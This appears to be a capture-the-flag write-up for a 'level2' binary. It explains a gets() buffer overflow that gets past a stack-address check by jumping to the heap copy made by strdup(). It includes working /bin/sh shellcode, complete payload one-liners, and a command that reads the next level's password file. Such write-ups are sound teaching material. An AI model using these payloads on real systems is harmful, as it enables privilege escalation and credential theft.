# Level2

## Code

```
#include <stdio.h>

void    p(void) {
    int buffer[16];

    fflush(stdout);
    gets(buffer);
    int ret = buffer[20];
    if ((ret & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret);
        exit(1);
    }
    puts(buffer);
    strdup(buffer);
}

int main(void) {
    p();
}
```


## Explanation

- For this level things start to get a little more complex

- This time, we don't have a function which launches a shell in the binary, so we'll have to use
    another strategy.

- Thanks to gdb and Ghidra, we saw the **main()** called a **p()** function which :
    - gets user input with **gets()**, again we know we can exploit this function to overflow the buffer
    - prints the obtained string with **puts()**
    - calls **strdup()** on the string

- Also, we determined thanks to [this site](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) that the offset from the beginning of the buffer to the return address spot in the stack was 80 bytes

- After some research, we decided our best option was to inject shellcode through user input to
    launch a shell with level3 privileges. Shell code is a set of instructions represented as a
    sequence of specific bytes which will be interpreted by the machine as instructions to execute


- So the idea is to inject our shell code inside the buffer, and then overflow the buffer with random
    characters until we reach the return address (80 bytes later) that will be popped in EIP at the end of the function
    so that the process will jump to the beginning of our string and execute our shell code. Of course, it meant that our
    shellcode needed to be less than 80 bytes. Luckily we found one of 24 bytes.

- So first we tried to give the program this payload :\
    `(python -c'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 56 + "\xdc\xf6\xff\xbf"'; cat) | ./level2`

    24 bytes of shellcode --> 56 random bytes to reach the ret address we want to modify --> the buffer address

- Annnnnnnd not yet... Here we faced another problem, the program implements some kind of protection by checking the
    return address value doesn't start with **"b"**, which unfortunately is the case with our stack allocated buffer.
    Then, the code never gets to jump to the return address we modified since there's an **exit()** call in this condition.

- But as we were wondering why there was a call to **strdup()** at the end of the program, we understood that this would
    allow us to have a heap allocated (with malloc) copy of our string, with a much lower address in memory that wouldn't
    trigger the condition we mentioned before.

- All that was left to do was replace the last 4 bytes of the payload (the return address) with the address of the heap
    allocated string where our shell code was going to be copied by **strdup()**. We could easily get this address by setting
    a breakpoint in **gdb** right after the **strdup()** call and check the value in eax register which contains the return value
    of functions :     eax            0x804a008	         134520840

- Here's the final payload to execute a terminal with level3 privileges :\

## Exploit
```
$   (python -c'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 56 + "\x08\xa0\x04\x08"'; cat) | ./level2

$   cat /home/user/level3/.pass
```